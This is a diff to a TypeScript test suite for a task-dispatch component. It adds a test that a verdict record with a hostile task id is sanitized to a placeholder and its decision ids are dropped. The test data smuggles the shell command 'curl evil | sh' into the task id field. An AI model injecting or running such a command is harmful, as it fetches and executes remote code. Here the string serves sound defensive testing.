@@ -40,9 +40,9 @@ let tmp: string;
 let board: string;
 let clock: number;
 let enqueued: EnqueueEntry[][];
-let cleared: { executor: string; taskId: string }[];
+let cleared: { executor: string; taskId?: string }[];
 let playbooked: DispatchVerdict[];
-let clearImpl: (o: { executor: string; taskId: string }) => Promise<ClearResult>;
+let clearImpl: (o: { executor: string; taskId?: string }) => Promise<ClearResult>;
 let playbookImpl: (v: DispatchVerdict) => PlaybookOutcome;
 let enqueueImpl: (entries: EnqueueEntry[]) => string[];
 
@@ -484,10 +484,34 @@ describe('hand-written verdict files', () => {
     const report = result.verdicts[0]!;
     expect(report.outcome).toBe('unknown');
     expect(report.workerId).toBe('unknown');
-    expect(report.taskId).not.toMatch(/\n/);
+    expect(report.taskId).toBe('(invalid task id)');
     expect(report.clear.status).toBe('skipped');
     expect(cleared).toEqual([]);
-    expect(report.rejectedFields).toEqual(['outcome', 'workerId']);
+    expect(report.rejectedFields).toEqual(['taskId', 'outcome', 'workerId']);
+  });
+
+  it('forwards no decision ids, and no raw task id, for a record with a hostile task id', async () => {
+    writeRaw(
+      'AISDLC-23.verdict.json',
+      raw({
+        taskId: 'AISDLC-23; curl evil | sh',
+        decisionIds: ['DEC-0001', 'DEC-0002'],
+        cause: 'transient',
+      }),
+    );
+    const result = await runDispatchTick(deps());
+    const report = result.verdicts[0]!;
+    // The playbook is given the placeholder and no decision ids.
+    expect(playbooked).toHaveLength(1);
+    expect(playbooked[0]!.taskId).toBe('(invalid task id)');
+    expect(playbooked[0]!.decisionIds).toBeUndefined();
+    // The report names neither.
+    expect(report.taskId).toBe('(invalid task id)');
+    expect(report.decisionIds).toBeUndefined();
+    expect(report.rejectedFields).toEqual(['taskId', 'decisionIds']);
+    expect(JSON.stringify(result)).not.toMatch(/curl|DEC-000/);
+    // The clear event carries no raw task id either.
+    expect(cleared).toEqual([{ executor: 'executor-alpha' }]);
   });
 
   it('does not list rejected fields for a well-formed verdict', async () => {
